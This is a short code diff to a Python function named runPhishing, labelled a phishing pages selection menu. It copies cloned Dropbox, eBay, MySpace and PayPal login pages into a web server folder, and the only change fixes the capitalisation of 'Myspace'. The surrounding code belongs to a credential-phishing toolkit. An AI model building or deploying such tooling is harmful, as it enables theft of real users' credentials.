@@ -113,7 +113,7 @@ def runPhishing(page, customOption):  # Phishing pages selection menu
         copy_tree("WebPages/dropbox/", "Server/www/")
     elif page == 'eBay':
         copy_tree("WebPages/ebay/", "Server/www/")
-    elif page == 'MySpace':
+    elif page == 'Myspace':
         copy_tree("WebPages/myspace/", "Server/www/")
     elif page == 'PayPal':
         copy_tree("WebPages/paypal/", "Server/www/")
